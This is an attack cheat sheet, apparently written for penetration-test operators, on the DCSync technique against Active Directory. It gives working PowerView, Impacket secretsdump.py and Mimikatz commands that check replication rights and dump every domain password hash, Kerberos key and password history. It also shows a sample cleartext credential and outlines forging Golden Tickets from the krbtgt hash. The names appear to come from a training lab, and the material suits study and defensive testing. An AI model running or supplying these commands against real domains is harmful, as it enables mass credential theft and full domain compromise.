# 🚀 **DCSync — Quick Guide for Operators**

## **1. What is DCSync?**

DCSync is an attack technique that **pretends to be a Domain Controller** and asks a real DC to replicate password data.

It works because AD allows DCs to synchronize using the **Directory Replication Service Remote Protocol (DRS)**.

To execute DCSync, an account must have **Extended Rights**:

* **DS-Replication-Get-Changes**
* **DS-Replication-Get-Changes-All**
* *(optionally)* **DS-Replication-Get-Changes-In-Filtered-Set**

Any account with these rights can dump **NTLM hashes**, **Kerberos keys**, and **password history** for the entire domain.

---

# ✔️ **2. How to Check If a User Has DCSync Rights (PowerView)**

```powershell
$sid = (Get-DomainUser adunn).objectsid
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
    ? { $_.SecurityIdentifier -match $sid -and $_.ObjectAceType -match "Replication" } |
    select AceQualifier, ActiveDirectoryRights, ObjectAceType
```

Look for rights:

```
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

If the account has **Get-Changes** + **Get-Changes-All**, it's fully DCSync-capable.

---

# 💥 **3. Performing DCSync Attacks**

## **Option A — Using Impacket (Linux)**

Dump **all** NTLM & Kerberos credentials:

```bash
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

Save output to files:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc \
    INLANEFREIGHT/adunn@172.16.5.5
```

Dump only NTLM:

```bash
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5
```

Dump only a specific user's hash:

```bash
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
```

---

## **Option B — Mimikatz (Windows)**

Start PowerShell as your DCSync-enabled user:

```powershell
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

Inside Mimikatz:

```powershell
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:administrator
```

Outputs:

* NTLM hash
* Kerberos keys
* Supplemental credentials
* Password last set
* RID, SID, UAC, etc.

---

# 🔍 **4. Files Output from secretsdump.py**

You will get:

| File               | Meaning                                             |
| ------------------ | --------------------------------------------------- |
| `*.ntds`           | NTLM hashes                                         |
| `*.ntds.kerberos`  | Kerberos AES / RC4 keys                             |
| `*.ntds.cleartext` | Cleartext (only for reversible encryption accounts) |

Example reversible encryption cleartext:

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

---

# 🧠 **5. Why DCSync Is Critical**

Once you have DCSync:

* You can dump **krbtgt** → forge **Golden Tickets** (indefinite domain persistence)
* Dump **administrator** → full DA access
* Dump every user → password analysis / lateral movement
* Extract password history → offline cracking for older creds
* Zero logs on the target user—**all requests appear as normal DC replication**

This is effectively **full domain compromise**.

---

# 🛠️ **6. Useful Flags in secretsdump.py**

| Flag                   | Purpose                     |
| ---------------------- | --------------------------- |
| `-just-dc`             | Dump only NTDS secrets      |
| `-just-dc-ntlm`        | Only NTLM hashes            |
| `-just-dc-user <user>` | Dump one user               |
| `-pwd-last-set`        | Show password last set time |
| `-history`             | Dump password history       |
| `-user-status`         | See enabled/disabled state  |

---

# 🔚 **Summary Flow**

1️⃣ Identify user → `Get-DomainUser`
2️⃣ Validate DCSync rights → `Get-ObjectACL`
3️⃣ Run DCSync using Impacket or Mimikatz
4️⃣ Dump hashes for domain compromise
5️⃣ (Optional) target `krbtgt` → forge Golden Ticket

---
```c
mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all" "exit"


```

example - finding user with revesible encryption enabled 
```c
STORE_WITH_REVERSIBLE_ENCRYPTION = 0x80 (decimal 128)
```
```c
Get-ADUser -Filter * -Properties UserAccountControl | 
Where-Object {($_.UserAccountControl -band 128)} | 
Select SamAccountName, UserAccountControl

```
